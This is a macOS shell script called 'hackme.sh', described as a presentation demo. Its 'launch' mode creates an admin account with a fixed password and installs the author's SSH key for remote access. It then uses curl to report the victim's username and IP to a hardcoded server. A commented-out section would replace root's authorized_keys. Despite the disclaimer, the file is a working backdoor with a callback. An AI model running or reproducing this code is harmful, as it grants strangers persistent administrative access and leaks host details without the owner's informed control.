# DISCLAIMER
#
# This file will create a user account in your system (Mac OS), add it to
# the admin group so he can perform admin tasks, and grant SSH access to me.
# The only purpose of this file is to demonstrate a tool usage and it is not
# intended to harm you or your system in any way. But hey, install it only
# at your own risk!

# Don't forget to run it with 'sudo ./hackme.sh delete' after the presentation
# to delete the created user

username=lab
pwd=4242
host_ip=10.200.224.141
if [ -z $1 ]
then
	echo "\033[92m -------------------- Usage: ---------------------\033[0m"
	echo "   sudo ./hackme.sh [args]\n"
	echo "\033[92m ------------- To launch the script --------------\033[0m"
	echo "   sudo ./hackme.sh launch\n"
	echo "\033[92m ------- To undo changes clean everything --------\033[0m"
	echo "   sudo ./hackme.sh delete\n"
fi
if [ "$1" = "launch" ]
then
	id=4242
	key="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7zm248lPhPmMrqt3uqRNYygrqG8O/n4sHpkKovXkwblfHx2oeF4BiHEtxV2qoFDNcSfBjV+54W64LUTnNKUdh3nhXannXsuahlPQiSX7FHc4ZWxeCqxd3vKYVO3PIuBi9XFFuH67cyFr0iNJcoJse5UG1t0jV0K3x+EpKKV5CR2e7+fRCM8kc/0D0eEtvww4N+aoTm5hXZSkuU2rMPMGC6OKxCnd9zOKF2xhkmR8I/WBrIVS5jnlfsHFvAZEk9Pcp/a+zSukrxQEnfvy1UM6Lc9xWbPWA8o49FkTwjHZtqpY3LuqpeTS6zpNpM21rQ0Z78YvtWqg3Hf2wUuOwvY9p esk@esk-ubuntu"
	dscl . -create /Users/$username
	dscl . -create /Users/$username UserShell /bin/bash
	dscl . -create /Users/$username RealName "Ansible $username"
	dscl . -create /Users/$username UniqueID $id
	dscl . -create /Users/$username PrimaryGroupID 1000
	dscl . -create /Users/$username NFSHomeDirectory /Local/Users/$username
	dscl . -passwd /Users/$username $pwd
	dscl . -append /Groups/admin GroupMembership $username

	# Grant SSH acces via USER method
	mkdir -p /Local/Users/$username
	mkdir /Local/Users/$username/.ssh
	touch /Local/Users/$username/.ssh/authorized_keys
	echo $key > /Local/Users/$username/.ssh/authorized_keys
	chown $username /Local/Users/lab

	# Make a request so my server knows you were "hacked"
	runner_user=`who | grep -m1 "" | cut -d " " -f1`
	runner_ip=`ifconfig  | grep inet | grep broadcast | cut -d " " -f2`
	url="http://$host_ip:5000?user=$runner_user=&ip=$runner_ip"
	curl $url

	# Grant SSH acces via ROOT [DANGER DANGER DANGER]
	# if [ -f /var/root/.ssh/authorized_keys ]
	# then
	# 	cp /var/root/.ssh/authorized_keys /var/root/.ssh/authorized_keys.old
	# fi
	# mkdir -p /var/root/.ssh
	# touch -f /var/root/.ssh/authorized_keys
	# echo $key > /var/root/.ssh/authorized_keys
elif [ "$1" = "delete" ]
then
	# Delete the created user and files
	dscl . delete /Users/$username
	rm -rf /Local/Users/$username
fi
